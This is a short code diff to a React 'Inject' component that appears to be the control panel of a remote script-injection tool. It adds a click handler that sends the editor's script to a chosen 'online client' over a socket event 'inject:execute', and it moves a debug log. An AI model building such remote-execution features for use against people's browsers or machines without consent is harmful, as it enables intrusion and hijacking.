@@ -1348,6 +1348,7 @@ class Inject extends Component {
       this.setState({
         clients: nextProps.clients
       })
+      console.log(nextState.clients)
     }
   }
 
@@ -1373,6 +1374,15 @@ class Inject extends Component {
     })
   }
 
+  execute = (id) => {
+    let { socket } = this.props
+    socket.emit('inject:execute', {
+      project: this.props.project,
+      id: id,
+      script: this.state.code,
+    })
+  }
+
   render() {
     const code = this.state.code
     const { classes, main } = this.props
@@ -1386,11 +1396,10 @@ class Inject extends Component {
             <ComputerIcon />
             Online clients ({this.state.clients ? this.state.clients.length : '0'})
           </ListSubheader>
-          {console.log(this.state.clients)}
           <List className={classes.injectList}>
             {this.state.clients && this.state.clients.map((client, i) => {
               return (
-                <ListItem key={i} button dense>
+                <ListItem key={i} button dense onClick={() => this.execute(client.id)}>
                   <ListItemIcon>
                     <img src={client.images.country} />
                   </ListItemIcon>
